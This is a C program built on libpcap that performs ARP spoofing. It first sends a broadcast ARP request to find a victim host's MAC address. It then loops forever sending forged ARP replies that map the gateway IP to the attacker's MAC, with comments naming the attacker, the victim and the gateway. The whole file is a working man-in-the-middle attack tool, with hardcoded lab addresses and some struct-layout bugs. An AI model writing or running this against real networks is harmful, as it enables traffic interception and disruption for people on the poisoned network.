#include <stdio.h>
#include <pcap.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/if.h>
#include <netdb.h>
#include <errno.h>
#include <netinet/if_ether.h>


struct my_ethhdr
{
    uint8_t dst[6];
    uint8_t src[6];
    uint16_t eth_type;
};

struct my_arp
{
    uint16_t hardtype;
    uint16_t prototype;
    uint8_t hardlength;
    uint8_t protosize;
    uint16_t opcode;
    uint8_t sender_mac[6];
    u_int32_t sender_ip[4];
    uint8_t target_mac[6];
    u_int32_t target_ip[4];
};

// get my mac address
char *get_attacker_mac(char *iface)
{
#define MAC_STRING_LENGTH 13
    char *ret = malloc(MAC_STRING_LENGTH);
    struct ifreq s;
    int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);

    strcpy(s.ifr_name, iface);
    if (fd >= 0 && ret && 0 == ioctl(fd, SIOCGIFHWADDR, &s))
    {
        int i;
        for (i = 0; i < 6; ++i)
            snprintf(ret+i*2,MAC_STRING_LENGTH-i*2,"%02x",(unsigned char) s.ifr_addr.sa_data[i]);
    }
    else
    {
        perror("malloc/socket/ioctl failed");
        exit(1);
    }
    return(ret);
}


int main(int argc, char **argv[])
{
    pcap_t *handle;
    char* dev;
    char errbuf[PCAP_ERRBUF_SIZE];

    struct pcap_pkthdr *header;
    const u_char* pkt_data;

    struct my_ethhdr *eths;
    struct my_arp *arps;

    dev = argv[1];
    if (dev == NULL) {
        fprintf(stderr, "Couldn't find default device: %s\n", errbuf);
        return(2);
    }
    char *mac = get_attacker_mac(dev);
    //printf("%s\n", mac);
    free(mac);

    // get host mac
    u_char packet[100];
    memset(packet, 0x00, 100);

    //Pcap open
    handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
        return(2);
    }

    // make packet
    u_char dest_mac[] = { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff };	// Broad cast FF FF FF FF FF FF
    u_char my_mac[] = {0x00, 0x0c, 0x29, 0x72, 0x9a, 0xb4};
    u_char ether_type[] = { 0x08, 0x06 }; //ARP
    u_char Hardware_Type[] = { 0x00, 0x01 };         //ETHERNET
    u_char Protocol_Type[] = { 0x08, 0x00 };         //IP
    u_char Hardware_Size[] = { 0x06 };
    u_char Protocol_Size[] = { 0x04 };
    u_char Opcode[] = { 0x00, 0x01 };
    u_char sender_mac[] = {0x00, 0x0c, 0x29, 0x72, 0x9a, 0xb4};
    u_char sender_ip[] = { 0xc0, 0xa8, 0xcb, 0x80 };		// Attack ip 192.168.203.128
    u_char target_mac[] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };   // Target mac 00 00 00 00 00 00
    u_char target_ip[] = { 0xc0, 0xa8, 0xcb, 0x81 };


    int i=0;

    for(i=0; i<6; i++) packet[i] = dest_mac[i];
    for(i=6; i<12; i++) packet[i] = my_mac[i-6];
    for(i=12; i<14; i++) packet[i] = ether_type[i-12];
    for(i=14; i<16; i++) packet[i] = Hardware_Type[i-14];
    for(i=16; i<18; i++) packet[i] = Protocol_Type[i-16];
    for(i=18; i<19; i++) packet[i] = Hardware_Size[0];
    for(i=19; i<20; i++) packet[i] = Protocol_Size[0];
    for(i=20; i<22; i++) packet[i] = Opcode[i-20];
    for(i=22; i<28; i++) packet[i] = sender_mac[i-22];
    for(i=28; i<32; i++) packet[i] = sender_ip[i-28];
    for(i=32; i<38; i++) packet[i] = target_mac[i-32];
    for(i=38; i<42; i++) packet[i] = target_ip[i-38];



    u_int8_t get_dest_mac[6];

    while(1)
    {
        pcap_sendpacket(handle, packet, sizeof( packet ));
        if((pcap_next_ex(handle, &header, &pkt_data) == 0))
            continue;
        if(pkt_data != NULL)
        {
            eths=(struct my_ethhdr *)pkt_data;
            if(ntohs(eths->eth_type)==ETHERTYPE_ARP)
            {
                arps = (struct my_arp *)(pkt_data+14);
                for(int i=0;i<6;i++)
                {
                    get_dest_mac[i]=arps->sender_mac[i];
                    //printf("%02x ",arps->sender_mac[i]);
                }
                break;
            }
        }
    }

    // get host mac
    u_char packet2[100];
    memset(packet2, 0x00, 100);

    // make packet
    u_char dest_mac_2[] = { 0x00, 0x0c, 0x29, 0x32, 0xaa, 0xb5 };	// victim mac
    u_char my_mac_2[] = {0x00, 0x0c, 0x29, 0x72, 0x9a, 0xb4};
    u_char ether_type_2[] = { 0x08, 0x06 }; //ARP
    u_char Hardware_Type_2[] = { 0x00, 0x01 };         //ETHERNET
    u_char Protocol_Type_2[] = { 0x08, 0x00 };         //IP
    u_char Hardware_Size_2[] = { 0x06 };
    u_char Protocol_Size_2[] = { 0x04 };
    u_char Opcode_2[] = { 0x00, 0x02 };
    u_char sender_mac_2[] = {0x00, 0x0c, 0x29, 0x72, 0x9a, 0xb4};
    u_char sender_ip_2[] = { 0xc0, 0xa8, 0xcb, 0x01 };		// gateway ip 192.168.203.1
    u_char target_mac_2[] = { 0x00, 0x0c, 0x29, 0x32, 0xaa, 0xb5 };
    u_char target_ip_2[] = { 0xc0, 0xa8, 0xcb, 0x81 };


    i=0;

    for(i=0; i<6; i++) packet2[i] = dest_mac_2[i];
    for(i=6; i<12; i++) packet2[i] = my_mac_2[i-6];
    for(i=12; i<14; i++) packet2[i] = ether_type_2[i-12];
    for(i=14; i<16; i++) packet2[i] = Hardware_Type_2[i-14];
    for(i=16; i<18; i++) packet2[i] = Protocol_Type_2[i-16];
    for(i=18; i<19; i++) packet2[i] = Hardware_Size_2[0];
    for(i=19; i<20; i++) packet2[i] = Protocol_Size_2[0];
    for(i=20; i<22; i++) packet2[i] = Opcode_2[i-20];
    for(i=22; i<28; i++) packet2[i] = sender_mac_2[i-22];
    for(i=28; i<32; i++) packet2[i] = sender_ip_2[i-28];
    for(i=32; i<38; i++) packet2[i] = target_mac_2[i-32];
    for(i=38; i<42; i++) packet2[i] = target_ip_2[i-38];

    printf("Start apr spoofing\n");

    while(1)
    {
        if (pcap_sendpacket(handle, packet2, sizeof( packet2 )) != 0)
            printf("error\n");
    }

}
